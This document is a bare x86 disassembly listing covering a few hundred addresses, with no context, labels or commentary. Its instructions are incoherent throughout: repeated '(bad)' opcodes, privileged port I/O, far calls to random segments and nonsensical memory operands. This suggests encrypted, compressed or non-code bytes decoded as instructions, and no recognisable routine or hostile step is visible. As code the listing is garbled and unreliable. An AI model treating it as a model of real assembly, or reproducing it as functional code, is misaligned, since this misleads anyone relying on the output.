  41cae4:	mov    edx,0x127a6623
  41cae9:	imul   ebx,esp,0x2c
  41caec:	sbb    al,0x89
  41caee:	mov    eax,ds:0xb24e19cb
  41caf3:	dec    esp
  41caf4:	imul   ecx,DWORD PTR [eax],0x67
  41caf7:	xchg   DWORD PTR [eax+0x37],ebp
  41cafa:	xlat   BYTE PTR ds:[ebx]
  41cafb:	lds    ebp,FWORD PTR [esi-0x356ae82c]
  41cb01:	cmp    BYTE PTR ds:0xc6ea180c,al
  41cb07:	stc    
  41cb08:	or     BYTE PTR [ebx],bl
  41cb0a:	cld    
  41cb0b:	sub    al,0x4e
  41cb0d:	cs jns 0x41cb44
  41cb10:	test   al,0xe4
  41cb12:	mov    al,ds:0xd60b3884
  41cb17:	in     eax,0x2b
  41cb19:	sti    
  41cb1a:	icebp  
  41cb1b:	xchg   ebp,eax
  41cb1c:	out    dx,eax
  41cb1d:	push   eax
  41cb1e:	inc    edx
  41cb1f:	cmp    ch,ah
  41cb21:	push   es
  41cb22:	les    ebp,FWORD PTR [eax-0x83a5e8b]
  41cb28:	sub    eax,esp
  41cb2a:	ins    BYTE PTR es:[edi],dx
  41cb2b:	ds aaa 
  41cb2d:	enter  0xf822,0x89
  41cb31:	add    BYTE PTR [ecx],bh
  41cb33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb34:	fisub  WORD PTR [edx-0x48cd9311]
  41cb3a:	mov    ds:0xa7e76773,al
  41cb3f:	or     BYTE PTR ds:0x61b51187,0x60
  41cb46:	mov    ecx,?
  41cb48:	shl    DWORD PTR [eax+edx*8-0x2ec801bb],0x19
  41cb50:	outs   dx,BYTE PTR ds:[esi]
  41cb51:	mov    dh,0x2c
  41cb53:	dec    esi
  41cb54:	dec    ecx
  41cb55:	ins    BYTE PTR es:[edi],dx
  41cb56:	jge    0x41cad8
  41cb58:	leave  
  41cb59:	dec    esi
  41cb5a:	dec    ebx
  41cb5b:	sbb    eax,0x7aef25b4
  41cb60:	pop    ds
  41cb61:	lds    ebp,FWORD PTR [ebx]
  41cb63:	in     eax,0xa9
  41cb65:	rcl    BYTE PTR [ecx-0xc],1
  41cb68:	push   ebx
  41cb69:	(bad)  
  41cb6a:	jle    0x41cb1d
  41cb6c:	or     bl,ch
  41cb6e:	inc    esp
  41cb6f:	cdq    
  41cb70:	mov    ds:0xf13c5c33,al
  41cb75:	lock dec edi
  41cb77:	push   esi
  41cb78:	mov    eax,0x10d9bac
  41cb7d:	call   0xfb15:0xa66ed7dc
  41cb84:	sbb    al,0x3c
  41cb86:	enter  0xd203,0x9e
  41cb8a:	push   ds
  41cb8b:	sub    ebx,DWORD PTR [eax+0x20]
  41cb8e:	jb     0x41cbc5
  41cb90:	adc    al,BYTE PTR [edi]
  41cb92:	sub    DWORD PTR [ebp-0x1c],edx
  41cb95:	rcl    BYTE PTR [ebx-0x4f],0xd2
  41cb99:	es push edi
  41cb9b:	in     al,0xb4
  41cb9d:	pop    ecx
  41cb9e:	inc    edx
  41cb9f:	push   edi
  41cba0:	inc    esp
  41cba1:	je     0x41cb4d
  41cba3:	lods   eax,DWORD PTR ds:[esi]
  41cba4:	xchg   DWORD PTR [ecx],edi
  41cba6:	xlat   BYTE PTR ds:[ebx]
  41cba7:	repz and eax,0x458a1897
  41cbad:	cmp    BYTE PTR ds:0xc92188a8,ah
  41cbb3:	sahf   
  41cbb4:	repnz add edx,eax
  41cbb7:	aas    
  41cbb8:	mov    BYTE PTR [ecx+0x4931ca48],ah
  41cbbe:	fist   DWORD PTR [ebx]
  41cbc0:	retf   0xeb5c
  41cbc3:	(bad)  
  41cbc4:	sbb    bh,BYTE PTR [ebx]
  41cbc6:	mov    al,0xa5
  41cbc8:	push   cs
  41cbc9:	sbb    eax,0x7c303f90
  41cbce:	push   ds
  41cbcf:	adc    BYTE PTR [edx+0x0],dh
  41cbd2:	lock or eax,0x3a74493d
  41cbd8:	xor    edx,DWORD PTR [ebp+0x39]
  41cbdb:	mov    eax,0xc449e7f2
  41cbe0:	add    ch,ch
  41cbe2:	leave  
  41cbe3:	and    BYTE PTR [esi+edi*2+0x6],al
  41cbe7:	imul   edi,ebp,0x6d
  41cbea:	cmp    BYTE PTR [edi-0x1ead6c3f],dl
  41cbf0:	xor    eax,0xaee83d7c
  41cbf5:	cwde   
  41cbf6:	lods   al,BYTE PTR ds:[esi]
  41cbf7:	push   ecx
  41cbf8:	mul    DWORD PTR [ecx+esi*4+0x34]
  41cbfc:	retf   0xfc7f
  41cbff:	jp     0x41cbb6
  41cc01:	mov    eax,ds:0xa86ca95c
  41cc06:	fsub   DWORD PTR [eax-0x61c1f37e]
  41cc0c:	push   edx
  41cc0d:	cmc    
  41cc0e:	jge    0x41cc32
  41cc10:	or     DWORD PTR [ecx],eax
  41cc12:	add    DWORD PTR [esi-0x65],0xffffffaa
  41cc16:	loop   0x41cc3d
  41cc18:	cmc    
  41cc19:	data16 scas al,BYTE PTR es:[edi]
  41cc1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc1c:	mov    dl,0x67
  41cc1e:	addr16 mov ebx,0x437243d5
  41cc24:	pop    eax
  41cc25:	jecxz  0x41cba8
  41cc27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc28:	xor    BYTE PTR [ebp-0x62107e46],bl
  41cc2e:	scas   al,BYTE PTR es:[edi]
  41cc2f:	in     eax,dx
  41cc30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc31:	iret   
  41cc32:	repnz sbb edx,eax
  41cc35:	repnz or al,0x4c
  41cc38:	mov    ah,0x21
  41cc3b:	mov    WORD PTR [edx+edx*1],ds
  41cc3e:	mov    ebp,0xc7223f23
  41cc43:	imul   ebp,ebx,0x61
  41cc46:	iret   
  41cc47:	nop
  41cc48:	(bad)  
  41cc49:	jns    0x41cc2f
  41cc4b:	xchg   esp,eax
  41cc4c:	cmpxchg ah,bh
  41cc4f:	dec    esi
  41cc50:	aam    0x83
  41cc52:	xchg   edi,eax
  41cc53:	retf   0x497a
  41cc56:	adc    esi,edx
  41cc58:	adc    DWORD PTR [edi-0x57a0ee8c],edx
  41cc5e:	stos   BYTE PTR es:[edi],al
  41cc5f:	mov    al,0xac
  41cc61:	inc    ebx
  41cc62:	mov    ah,0x2e
  41cc64:	or     BYTE PTR [eax-0x3ef0996e],0x91
  41cc6b:	in     al,0xfd
  41cc6d:	xchg   ebp,eax
  41cc6e:	jnp    0x41cc40
  41cc70:	xor    al,0xc
  41cc72:	add    al,0xba
  41cc74:	scas   eax,DWORD PTR es:[edi]
  41cc75:	mov    dl,0xcf
  41cc77:	adc    esp,DWORD PTR [esi-0x1f0c3943]
  41cc7d:	xor    al,0x78
  41cc7f:	outs   dx,BYTE PTR ds:[esi]
  41cc80:	mov    eax,0xea1a31c9
  41cc85:	fcom   QWORD PTR [ecx]
  41cc87:	inc    esp
  41cc88:	mov    esi,0xb345fc4
  41cc8d:	or     DWORD PTR [eax-0x624d88e0],esp
  41cc93:	jge    0x41cccc
  41cc95:	jecxz  0x41cc2a
  41cc97:	ja     0x41cc4a
  41cc99:	hlt    
  41cc9a:	popa   
  41cc9b:	ja     0x41cc74
  41cc9d:	add    esp,DWORD PTR [esp+eiz*2]
  41cca0:	fdiv   QWORD PTR [esi]
  41cca2:	sbb    eax,0x68856c63
  41cca7:	inc    ebx
  41cca8:	mov    al,0x29
  41ccaa:	add    DWORD PTR [ebx+0x769aea57],ebx
  41ccb0:	dec    esp
  41ccb1:	dec    ebp
  41ccb2:	inc    edx
  41ccb3:	into   
  41ccb4:	out    0x80,eax
  41ccb6:	lock scas al,BYTE PTR es:[edi]
  41ccb8:	pop    ebx
  41ccb9:	rol    DWORD PTR [ebx],cl
  41ccbb:	ins    BYTE PTR es:[edi],dx
  41ccbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccbd:	shl    BYTE PTR [ebp-0x73],1
  41ccc0:	outs   dx,DWORD PTR ds:[esi]
  41ccc1:	sub    DWORD PTR [edi+0x18],ebx
  41ccc4:	sbb    ah,0x96
  41ccc7:	sub    DWORD PTR [ebp+ebp*4-0x28b5e4fc],ecx
  41ccce:	cmp    BYTE PTR [esi],0x5d
  41ccd1:	pop    esp
  41ccd2:	pop    ecx
  41ccd3:	or     DWORD PTR [eax-0x65],edx
  41ccd6:	or     edi,DWORD PTR ss:[ecx-0x29f04387]
  41ccdd:	aad    0x8f
  41ccdf:	push   eax
  41cce0:	fwait
  41cce1:	xchg   esp,eax
  41cce2:	push   esp
  41cce3:	sub    esp,edx
  41cce5:	jno    0x41cc9e
  41cce7:	retf   0x8434
  41ccea:	xchg   edi,eax
  41cceb:	mov    esp,0x13f7388d
  41ccf0:	jnp    0x41cca8
  41ccf2:	xor    eax,0x236692eb
  41ccf7:	test   eax,0x3d640ad9
  41ccfc:	cmp    BYTE PTR [ebx*1-0x19cf797c],0x40
  41cd04:	jno    0x41cd46
  41cd06:	mov    esp,0x41339260
  41cd0b:	add    al,BYTE PTR [ebx]
  41cd0d:	repnz xchg ebx,eax
  41cd0f:	sbb    eax,0xa3c3415d
  41cd14:	(bad)  
  41cd15:	and    DWORD PTR [ebx-0x64d0f915],ecx
  41cd1b:	sub    ah,bl
  41cd1d:	pop    ds
  41cd1e:	xchg   ebx,eax
  41cd1f:	sub    al,0xc7
  41cd21:	sbb    al,0xe1
  41cd23:	ins    DWORD PTR es:[edi],dx
  41cd24:	xchg   DWORD PTR [esp+0x38e60874],eax
  41cd2b:	fimul  DWORD PTR [eax+0x79]
  41cd2e:	adc    eax,0x697e6718
  41cd33:	into   
  41cd34:	pop    esi
  41cd35:	daa    
  41cd36:	pop    edx
  41cd37:	mov    dh,0xc1
  41cd39:	int3   
  41cd3a:	push   0x23c73115
  41cd3f:	cwde   
  41cd40:	or     esi,DWORD PTR [ebx+0x4ba697e]
  41cd46:	add    al,0x43
  41cd48:	add    eax,0xc5d5e25c
  41cd4d:	dec    eax
  41cd4e:	xor    cl,BYTE PTR [ebx]
  41cd50:	xchg   ecx,eax
  41cd51:	sar    ecx,0xc3
  41cd54:	add    ebp,ebx
  41cd56:	adc    DWORD PTR [eax+0x67],esi
  41cd59:	sub    DWORD PTR ss:[esi+0xb],ecx
  41cd5d:	dec    esi
  41cd5e:	loope  0x41cd9a
  41cd60:	inc    edi
  41cd61:	popa   
  41cd62:	push   0xffffffd1
  41cd64:	add    DWORD PTR [edx],eax
  41cd66:	pop    edi
  41cd67:	iret   
  41cd68:	adc    DWORD PTR [eax-0x3c66c922],0x6004a6fd
  41cd72:	int3   
  41cd73:	nop
  41cd74:	push   0xffffffe3
  41cd76:	xchg   esi,eax
  41cd77:	in     eax,0x4e
  41cd79:	(bad)  
  41cd7a:	and    ch,BYTE PTR [edi+0x59]
  41cd7d:	out    0xd7,al
  41cd7f:	sar    DWORD PTR [esi+0x4c763899],cl
  41cd85:	loope  0x41cd96
  41cd87:	popa   
  41cd88:	add    ecx,DWORD PTR [esi+ebx*2-0x35]
  41cd8c:	idiv   edi
  41cd8e:	xor    BYTE PTR [edi-0x5b3a47d9],0xe3
  41cd95:	aam    0x68
  41cd97:	xchg   ebx,eax
  41cd98:	mov    ah,0xe0
  41cd9a:	nop
  41cd9b:	retf   
  41cd9c:	xrstor [esi+0x7e]
  41cda0:	mov    esi,0x2bed1d6c
  41cda5:	mov    ds:0xeab46f04,al
  41cdaa:	or     DWORD PTR [eax-0x5f],ebp
  41cdad:	aad    0x89
  41cdaf:	sbb    cl,BYTE PTR [ebx+0x610f400b]
  41cdb5:	inc    eax
  41cdb6:	dec    ebx
  41cdb7:	or     eax,0xc758e1ca
  41cdbc:	jmp    0x41cd47
  41cdbe:	loop   0x41cda6
  41cdc0:	fidiv  WORD PTR [esp+ecx*1]
  41cdc3:	fnstcw WORD PTR [edx-0x4b7644cf]
  41cdc9:	(bad)  
  41cdca:	fimul  DWORD PTR [edi-0x39]
  41cdcd:	ins    DWORD PTR es:[edi],dx
  41cdce:	pop    esi
  41cdcf:	sbb    eax,0xcd1a3b16
  41cdd4:	mov    bh,0x6c
  41cdd6:	add    al,0x46
  41cdd8:	cmp    ah,BYTE PTR [edi-0x75f5009e]
  41cdde:	shr    BYTE PTR [esi],cl
  41cde0:	loopne 0x41cdf6
  41cde2:	repnz in al,0xb
  41cde5:	ret    0x9d34
  41cde8:	push   ecx
  41cde9:	pop    edi
  41cdea:	sbb    al,0xe3
  41cdec:	jmp    esp
  41cdee:	inc    ebp
  41cdef:	xchg   ebx,eax
  41cdf0:	mov    edi,0xfd66f269
  41cdf5:	pop    ecx
  41cdf6:	sbb    edx,DWORD PTR [ecx]
  41cdf8:	sti    
  41cdf9:	lods   al,BYTE PTR ds:[esi]
  41cdfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdfb:	inc    esi
  41cdfc:	retf   
  41cdfd:	lods   al,BYTE PTR ds:[esi]
  41cdfe:	adc    DWORD PTR [edx+0x0],ebx
  41ce01:	popf   
  41ce02:	sbb    ah,BYTE PTR [eax+0x71]
  41ce05:	fwait
  41ce06:	daa    
  41ce07:	sub    al,0x6a
  41ce09:	rcl    al,cl
  41ce0b:	out    dx,al
  41ce0c:	push   0x69
  41ce0e:	mov    al,0x46
  41ce10:	cmc    
  41ce11:	jmp    0x41ce78
  41ce13:	mov    ds:0xd17f1e73,eax
  41ce18:	xor    ah,bl
  41ce1a:	ret    0x74b9
  41ce1d:	pop    ds
  41ce1e:	push   0xffffffb3
  41ce20:	jb     0x41ce55
  41ce22:	aaa    
  41ce23:	jp     0x41cea3
  41ce25:	xchg   esp,eax
  41ce26:	cmp    DWORD PTR [ebp-0x6db31ac4],esp
  41ce2c:	dec    ecx
  41ce2d:	(bad)  
  41ce2e:	into   
  41ce2f:	push   0xf3cf3322
  41ce34:	or     BYTE PTR [edx+0x27],0xf3
  41ce38:	imul   ecx,DWORD PTR [edx-0x57],0x60
  41ce3c:	jle    0x41ce7c
  41ce3e:	stos   DWORD PTR es:[edi],eax
  41ce3f:	pop    ebx
  41ce40:	mov    dl,0x7e
  41ce42:	mov    ch,0xb9
  41ce44:	out    dx,al
  41ce45:	js     0x41cdd1
  41ce47:	jg     0x41cddc
  41ce49:	sub    al,BYTE PTR [edi]
  41ce4b:	adc    ah,dl
  41ce4d:	inc    ecx
  41ce4e:	adc    al,0x50
  41ce50:	ins    BYTE PTR es:[edi],dx
  41ce51:	test   eax,0xcde73abf
  41ce56:	dec    eax
  41ce57:	mov    ebx,0x57f66508
  41ce5c:	shl    ebp,cl
  41ce5e:	inc    ebx
  41ce5f:	fld    DWORD PTR [ebp-0x59]
  41ce62:	inc    edx
  41ce63:	xchg   edi,eax
  41ce64:	mov    bh,0xd0
  41ce66:	sbb    eax,0x140b3646
  41ce6b:	bound  edx,QWORD PTR [eax+0x4b]
  41ce6e:	movlps QWORD PTR [esi-0x172064b8],xmm1
  41ce75:	push   esp
  41ce76:	jl     0x41cedf
  41ce78:	or     DWORD PTR [esi+0x46],ebp
  41ce7b:	xor    BYTE PTR [ebx-0x7971558f],cl
  41ce81:	pushf  
  41ce82:	xchg   ebx,eax
  41ce83:	xor    esp,DWORD PTR [eax-0xf09215f]
  41ce89:	jnp    0x41ce39
  41ce8b:	sub    esi,ebx
  41ce8d:	push   eax
  41ce8e:	dec    edx
  41ce8f:	mov    ebp,0x7ffc5768
  41ce94:	jmp    0xdc94fce4
  41ce99:	xchg   ebp,eax
  41ce9a:	sub    BYTE PTR [edi-0x5b],dl
  41ce9d:	dec    eax
  41ce9e:	stos   DWORD PTR es:[edi],eax
  41ce9f:	cmp    DWORD PTR [ecx-0x5fc54824],esp
  41cea5:	retf   0x2df1
  41cea8:	and    edx,DWORD PTR fs:[edx+0xb71287]
  41ceaf:	dec    esi
  41ceb0:	xchg   esp,eax
  41ceb1:	push   0xd44d43a8
  41ceb6:	lods   al,BYTE PTR ds:[esi]
  41ceb7:	(bad)  
  41ceb8:	outs   dx,DWORD PTR ds:[esi]
  41ceb9:	in     eax,dx
  41ceba:	arpl   WORD PTR [edi+eax*2-0x23],di
  41cebe:	in     eax,0x1e
  41cec0:	push   edi
  41cec1:	jne    0x41cea1
  41cec3:	sahf   
  41cec4:	dec    ebp
  41cec5:	pop    esp
  41cec6:	lock mov ebp,0x32cdc4c3
  41cecc:	aas    
  41cecd:	ror    bh,1
  41cecf:	jae    0x41ce5c
  41ced1:	cmp    BYTE PTR [eax+0x1e],bl
  41ced4:	aad    0x1d
  41ced6:	ror    DWORD PTR ds:0x4719412a,cl
  41cedc:	pop    es
  41cedd:	xor    edx,DWORD PTR [edx-0x3d5cb951]
  41cee3:	inc    ecx
  41cee4:	repnz xlat BYTE PTR ds:[ebx]
  41cee6:	dec    esp
  41cee7:	(bad)  
  41cee8:	js     0x41ce98
  41ceea:	sub    eax,0x3bf4bb07
  41ceef:	jg     0x41cf09
  41cef1:	frstor [ebx+0x18e9b906]
  41cef7:	mov    dl,0xeb
  41cef9:	test   BYTE PTR [ebx],0xea
  41cefc:	xchg   edx,eax
  41cefd:	stos   BYTE PTR es:[edi],al
  41cefe:	push   cs
  41ceff:	and    BYTE PTR [edi-0x3ead4d09],ch
  41cf05:	cmp    eax,0xa23887bc
  41cf0a:	sahf   
  41cf0b:	xchg   esp,eax
  41cf0c:	mov    edx,0xdd5b2e35
  41cf11:	cmp    DWORD PTR [eax+0x12],edx
  41cf14:	xor    al,0xeb
  41cf16:	and    BYTE PTR [edx+0x14],bl
  41cf19:	ret    0x4f02
  41cf1c:	rcr    DWORD PTR [edx+0x37a92762],1
  41cf22:	loop   0x41cf72
  41cf24:	(bad)  
  41cf25:	sub    ch,dl
  41cf27:	jae    0x41ceeb
  41cf29:	rcr    eax,1
  41cf2b:	add    al,0x7b
  41cf2d:	pop    ss
  41cf2e:	or     ebp,0xb
  41cf31:	push   ecx
  41cf32:	mov    cs,WORD PTR [ecx]
  41cf34:	inc    esp
  41cf35:	jl     0x41cebe
  41cf37:	xlat   BYTE PTR ds:[ebx]
  41cf38:	imul   bh
  41cf3a:	push   ss
  41cf3b:	add    ah,al
  41cf3d:	stos   DWORD PTR es:[edi],eax
  41cf3e:	lods   al,BYTE PTR ds:[esi]
  41cf3f:	xor    edx,DWORD PTR [edx+0x5b294a6]
  41cf45:	ror    BYTE PTR [ebx-0x57],cl
  41cf48:	out    dx,eax
  41cf49:	inc    ebx
  41cf4a:	mov    bh,0x98
  41cf4c:	and    dl,BYTE PTR [edx-0x59f8cb13]
  41cf52:	xor    ah,BYTE PTR [ebx-0x7e146db8]
  41cf58:	arpl   WORD PTR [esi],sp
  41cf5a:	(bad)  
  41cf5b:	cmp    BYTE PTR [ebx+0x60],ah
  41cf5e:	jge    0x41cf95
  41cf60:	or     al,0xf2
  41cf62:	mov    ecx,0x7ae1f087
  41cf67:	push   ebx
  41cf68:	cmp    DWORD PTR [ebx-0x425d8acb],0x6d
  41cf6f:	les    ebx,FWORD PTR [ecx-0x4a41ce0f]
  41cf75:	push   esp
  41cf76:	daa    
  41cf77:	dec    edx
  41cf78:	popf   
  41cf79:	mov    esi,0xc2f3d014
  41cf7e:	stc    
  41cf7f:	jp     0x41cf98
  41cf81:	sbb    DWORD PTR [eax-0x35],edi
  41cf84:	adc    DWORD PTR [edx-0x4],ecx
  41cf87:	shl    DWORD PTR [ecx+0x26],1
  41cf8a:	das    
  41cf8b:	test   BYTE PTR [esi-0x68],dl
  41cf8e:	ins    DWORD PTR es:[edi],dx
  41cf8f:	xchg   esp,eax
  41cf90:	mov    ebx,0x41f800d6
  41cf95:	call   0xb114bd49
  41cf9a:	lods   al,BYTE PTR ds:[esi]
  41cf9b:	inc    eax
  41cf9c:	outs   dx,DWORD PTR ds:[esi]
  41cf9d:	ficomp DWORD PTR [eax-0x1a]
  41cfa0:	xor    al,BYTE PTR [ebx-0x16bc7510]
  41cfa6:	or     dl,0x8d
  41cfa9:	fsubr  st(6),st
  41cfab:	mov    dl,0xfe
  41cfad:	xor    eax,0x1f17f3b9
  41cfb2:	out    dx,al
  41cfb3:	mov    bl,0xe2
  41cfb5:	into   
  41cfb6:	mov    BYTE PTR [ecx-0x23],bh
  41cfb9:	(bad)  
  41cfba:	xor    DWORD PTR [esi],esi
  41cfbc:	push   edi
  41cfbd:	imul   edi,DWORD PTR [ecx+0x22],0xe5d93673
  41cfc4:	inc    edx
  41cfc5:	mov    ecx,0x9453f9ae
  41cfca:	sub    BYTE PTR [ecx+0x345031cf],ah
  41cfd0:	fnstenv [edi-0x5e33e3c8]
  41cfd6:	push   0x333f8bde
  41cfdb:	call   0x2433:0xbb2a7ce0
  41cfe2:	and    ah,BYTE PTR [ebp+0x42]
  41cfe5:	and    DWORD PTR [edx],0xffffffe2
  41cfe8:	inc    esi
  41cfe9:	push   edi
  41cfea:	mov    esi,0x8f732edf
  41cfef:	push   ds
  41cff0:	fld    st(1)
  41cff2:	sub    dl,BYTE PTR [eax]
  41cff4:	adc    ebx,DWORD PTR [esi+ecx*8+0x3d]
  41cff8:	cdq    
  41cff9:	ja     0x41d01a
  41cffb:	in     al,0x6b
  41cffd:	(bad)  
  41cffe:	adc    al,0x10
  41d000:	or     al,0xd9
  41d002:	sub    edi,DWORD PTR [eax-0x45]
  41d005:	mov    esp,0xbf1fe7d3
  41d00a:	loop   0x41d023
  41d00c:	adc    edi,ebp
  41d00e:	jnp    0x41d03e
  41d010:	inc    edi
  41d011:	pop    ds
  41d012:	pop    ecx
  41d013:	sub    dh,ah
  41d015:	out    0xad,eax
  41d017:	push   edi
  41d018:	dec    edi
  41d019:	and    dh,BYTE PTR [ecx]
  41d01b:	test   al,0x25
  41d01d:	push   esi
  41d01e:	bound  edi,QWORD PTR [ebp+esi*1-0x7e]
  41d022:	mov    eax,fs:0xda2aefc7
  41d028:	adc    eax,0x6f18ca2a
  41d02d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d02e:	sbb    BYTE PTR [eax+0x24],dl
  41d031:	inc    esi
  41d032:	cmp    cl,BYTE PTR [ecx-0x6756515d]
  41d038:	inc    edx
  41d039:	or     DWORD PTR [eax],0x1e
  41d03c:	cmp    BYTE PTR [ebx-0x50],dh
  41d03f:	(bad)  
  41d040:	mov    DWORD PTR cs:[ebx],eax
  41d043:	mov    ebp,0x250ee9e0
  41d048:	and    edi,DWORD PTR gs:[eax-0x44]
  41d04c:	jne    0x41d07f
  41d04e:	push   esi
  41d04f:	clc    
  41d050:	int3   
  41d051:	mov    DWORD PTR [ecx+0x6a],edx
  41d054:	icebp  
  41d055:	mov    dh,0x2b
  41d057:	and    dh,BYTE PTR [edi+0x4b]
  41d05a:	push   0x7f
  41d05c:	(bad)  
  41d05d:	sbb    eax,edi
  41d05f:	mov    ch,0x12
  41d061:	gs pop esi
  41d063:	inc    esi
  41d064:	enter  0x7832,0x59
  41d068:	push   cs
  41d069:	cld    
  41d06a:	jne    0x41d0c8
  41d06c:	loope  0x41d06d
  41d06e:	or     esi,DWORD PTR [ecx-0x70cc266d]
  41d074:	dec    esi
  41d075:	sbb    edi,DWORD PTR [eax-0x275681fc]
  41d07b:	gs mov ebp,0xb9601eeb
  41d081:	leave  
  41d082:	cld    
  41d083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d084:	adc    DWORD PTR [ecx],esp
  41d086:	and    DWORD PTR [esi-0x115c6c3c],ebx
  41d08c:	xchg   DWORD PTR [edx],ebx
  41d08e:	sub    al,0x94
  41d090:	mov    ebp,0x3799d099
  41d095:	push   0x98d8fcac
  41d09a:	mov    bl,0x1d
  41d09c:	push   es
  41d09d:	sub    esi,DWORD PTR [eax+0x60]
  41d0a0:	addr16 (bad) 
  41d0a2:	(bad)  
  41d0a3:	lods   eax,DWORD PTR ds:[esi]
  41d0a4:	and    DWORD PTR [edx+0x60],ebp
  41d0a7:	repz pop eax
  41d0a9:	bound  ebx,QWORD PTR [eax-0x96f5f64]
  41d0af:	adc    ch,BYTE PTR [ebp+0xd29b217]
  41d0b5:	sbb    esp,edx
  41d0b7:	and    cl,BYTE PTR [esi+0xaa999e7]
  41d0bd:	sbb    BYTE PTR [esi+0x1869dee8],bh
  41d0c3:	stc    
  41d0c4:	adc    eax,0x2c54fc3f
  41d0c9:	bound  ebp,QWORD PTR ds:0xb9d08e0c
  41d0cf:	push   edi
  41d0d0:	in     eax,dx
  41d0d1:	add    DWORD PTR [ebx+0x68661978],ebx
  41d0d7:	aam    0xa3
  41d0d9:	mov    edx,0x70d89ac6
  41d0de:	retf   0x83a
  41d0e1:	fsubr  st(2),st
  41d0e3:	test   BYTE PTR [ebx+eiz*2+0x6d8cfe8],ch
  41d0ea:	xor    eax,DWORD PTR [ecx+eax*1+0x503f35d4]
  41d0f1:	inc    ebx
  41d0f2:	(bad)
  41d0f5:	fdiv   DWORD PTR [ebp-0x21]
  41d0f8:	(bad)  
  41d0f9:	leave  
  41d0fa:	ja     0x41d0f3
  41d0fc:	ret    0x7a6e
  41d0ff:	mov    DWORD PTR ds:0x9008b4ce,edi
  41d105:	mov    dl,0x3e
  41d107:	je     0x41d0e0
  41d109:	xlat   BYTE PTR ds:[ebx]
  41d10a:	sub    BYTE PTR [ecx+ebp*8-0x7097ded0],dl
  41d111:	sbb    DWORD PTR fs:[ebx+0x5b],edi
  41d115:	and    DWORD PTR [ebx-0x40],ecx
  41d118:	push   0x31
  41d11a:	dec    esi
  41d11b:	push   ebx
  41d11c:	ins    BYTE PTR es:[edi],dx
  41d11d:	inc    ebx
  41d11e:	in     al,dx
  41d11f:	or     BYTE PTR [esi+0x53218adf],ah
  41d125:	mov    eax,0x538be8a1
  41d12a:	fs pop edi
  41d12c:	push   ds
  41d12d:	inc    eax
  41d12e:	arpl   WORD PTR [ecx-0x1b916ed7],si
  41d134:	adc    al,0xc1
  41d136:	jg     0x41d0c8
  41d138:	in     eax,dx
  41d139:	out    dx,eax
  41d13a:	fild   WORD PTR [ecx-0x6b]
  41d13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d13e:	xchg   esi,eax
  41d13f:	pop    ebx
  41d140:	dec    esp
  41d141:	imul   esp,DWORD PTR ds:0x8c409093,0x52
  41d148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d149:	pop    ds
  41d14a:	add    eax,0xf0ebb649
  41d14f:	ins    DWORD PTR es:[edi],dx
  41d150:	hlt    
  41d151:	xor    al,0x5b
  41d153:	sub    BYTE PTR [esi-0x3c],al
  41d156:	mov    edx,0xed918912
  41d15b:	addr16 jno 0x41d1a9
  41d15e:	mov    eax,ds:0x670ac5e4
  41d163:	inc    ecx
  41d164:	or     BYTE PTR ds:0xce75ea16,0x89
  41d16b:	adc    ah,BYTE PTR [eax-0x214b37b5]
  41d171:	cs inc eax
  41d173:	sub    ecx,DWORD PTR [eax+ebx*8+0x40]
  41d177:	icebp  
  41d178:	inc    ebp
  41d179:	test   al,0x72
  41d17b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d17c:	retf   0xade9
  41d17f:	in     al,dx
  41d180:	push   ds
  41d181:	(bad)  
  41d182:	and    al,0x2e
  41d184:	in     al,0xd5
  41d186:	das    
  41d187:	or     esp,DWORD PTR [edx-0x22d432a]
  41d18d:	pop    esp
  41d18e:	or     DWORD PTR [edx+0x34119ee6],esi
  41d194:	dec    ebp
  41d195:	mov    eax,0xa4e5d87b
  41d19a:	fdivr  QWORD PTR [edx]
  41d19c:	icebp  
  41d19d:	cmp    esi,DWORD PTR [edx+esi*1]
  41d1a0:	inc    esi
  41d1a1:	lods   eax,DWORD PTR ds:[esi]
  41d1a2:	enter  0xe346,0xe8
  41d1a6:	in     eax,0xbe
  41d1a8:	clc    
  41d1a9:	add    al,0xd3
  41d1ab:	mov    esi,0xa9ecec3f
  41d1b0:	push   0xd015bc63
  41d1b5:	scas   eax,DWORD PTR es:[edi]
  41d1b6:	jg     0x41d1bc
  41d1b8:	ds xchg ebp,eax
  41d1ba:	sbb    DWORD PTR [eax+0x541585d3],ebx
  41d1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1c1:	clc    
  41d1c2:	cli    
  41d1c3:	repnz cmp al,BYTE PTR [ebp+0x27]
  41d1c7:	and    DWORD PTR [ecx-0x3ae6532],eax
  41d1cd:	loopne 0x41d24a
  41d1cf:	mov    DWORD PTR [edi],ebp
  41d1d1:	mov    cl,cl
  41d1d3:	sub    al,0xb4
  41d1d5:	jmp    0x41d253
  41d1d7:	pushf  
  41d1d8:	jo     0x41d1a0
  41d1da:	sbb    ebp,0x60d9deab
  41d1e0:	les    ebp,FWORD PTR [ebp-0x64]
  41d1e3:	pop    ss
  41d1e4:	jae    0x41d1e0
  41d1e6:	(bad)  
  41d1e7:	dec    esp
  41d1e8:	xor    BYTE PTR [edi+0x1cdad89f],al
  41d1ee:	aaa    
  41d1ef:	stc    
  41d1f0:	call   0xf8a0ca9f
  41d1f5:	les    ecx,FWORD PTR [edx+0x383b8195]
  41d1fb:	dec    ebx
  41d1fc:	mov    ecx,0xfba5fc19
  41d201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d202:	sub    DWORD PTR [edi+0x69b977b2],0xffffff8e
  41d209:	mov    dl,0xe7
  41d20b:	in     al,dx
  41d20c:	cli    
  41d20d:	sub    DWORD PTR [eax-0x24],edi
  41d210:	and    DWORD PTR [ebp-0x74],edi
  41d213:	mov    ds:0x3f3f3ebb,al
  41d218:	imul   ebp,DWORD PTR [edi+0x1c2913e9],0x5e
  41d21f:	call   0x189d:0xdacf661d
  41d226:	jp     0x41d273
  41d228:	mov    al,ds:0x8c56bed5
  41d22d:	pushf  
